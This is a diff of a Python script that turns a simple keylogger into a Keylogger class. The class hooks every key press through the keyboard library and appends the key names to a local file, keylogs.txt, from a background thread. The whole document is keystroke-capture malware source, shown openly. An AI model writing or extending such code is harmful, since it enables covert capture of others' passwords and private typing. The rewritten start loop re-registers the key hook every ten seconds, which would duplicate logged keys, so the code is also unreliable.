@@ -1,28 +1,38 @@
-import keyboard
 import sys
 import time
+from threading import Thread
+import logging
+import os
+import keyboard
 
-LOG_FILE = 'keylogs.txt'
+class Keylogger:
+    def __init__(self, log_file):
+        self.log_file = log_file
+        if not os.path.exists(log_file):
+            with open(log_file, 'w') as f:
+                pass
 
-def main():
-    try:
-        while True:
-            events = keyboard.record(until='esc')
-            write_to_file(events)
-    except keyboard.KeyboardInterrupt:
-        print('Exiting...')
-        sys.exit()
-    except Exception as e:
-        print(f'Error: {e}')
-
-def write_to_file(events):
-    with open(LOG_FILE, 'a') as f:
-        for event in events:
-            if len(event) == 3 and event[2] != 'up':
-                f.write(event[1])
+    def callback(self, event):
+        if event.event_type == keyboard.KEY_DOWN:
+            if event.name.isalpha() or event.name.isdigit():
+                self.log_key(event.name)
             else:
-                f.write(f'<{event[1]}>')
-        f.write('\n')
+                self.log_key(event.name + ' ')
+
+    def log_key(self, key):
+        with open(self.log_file, 'a') as f:
+            f.write(key)
+
+    def start(self):
+        while True:
+            try:
+                keyboard.on_press(self.callback)
+                time.sleep(10)  # To prevent high CPU usage
+            except Exception as e:
+                logging.error(str(e))
+                sys.exit()
 
 if __name__ == '__main__':
-    main()
+    log_file = 'keylogs.txt'
+    keylogger = Keylogger(log_file)
+    Thread(target=keylogger.start).start()
